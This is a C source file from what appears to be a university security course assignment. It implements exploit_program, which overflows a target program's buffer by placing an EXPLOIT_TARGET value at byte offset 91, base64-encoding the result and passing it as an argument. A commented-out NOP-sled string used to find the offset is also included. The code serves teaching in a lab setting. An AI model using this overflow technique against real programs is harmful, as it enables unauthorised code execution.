// Authors: abcde fghij [replace with your RU login IDs]
// Group: xzy [replace with your group number]
#include <stdlib.h>
#include "run_program.h"
#include "exploit_program.h"
#include <string.h>
#include "base64.h"
int exploit_program(char *prog, char *message) {
	// This template executes program 'prog' with the parameter 'message'

	// In order to exploit a vulnerability in the program 'prog', you need to manipulate the parameters
	// I.e. use run_program with a different argv. It is your task to find out how :)
	
	// run the program with parameter 'message'
	// This is your function from assignment P2.
	// If you don't have that working, we will provided a sample solution after the (late) submission deadline of P2.

	//Used to find offset.
	//char bufferAttack[110] = "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90";
	//strcat(temp,bufferAttack);
	//strcat(temp,EXPLOIT_TARGET);
	
	char temp[200] = "";
	strcat(temp,message);

	int i = 0;
	int Offset = 91;
	while (EXPLOIT_TARGET[i] != '\0'){
		temp[i+Offset] = EXPLOIT_TARGET[i];
		i++;
	}
	temp[i+Offset+1] = '\0';

	char temp2[200];
	b64_encode((const unsigned char *)temp, 1+Offset+strlen(EXPLOIT_TARGET),(unsigned char *)temp2);

	char *argv[]={
		"-b",
		temp2,
		NULL
	};
	return run_program(prog, argv);
}
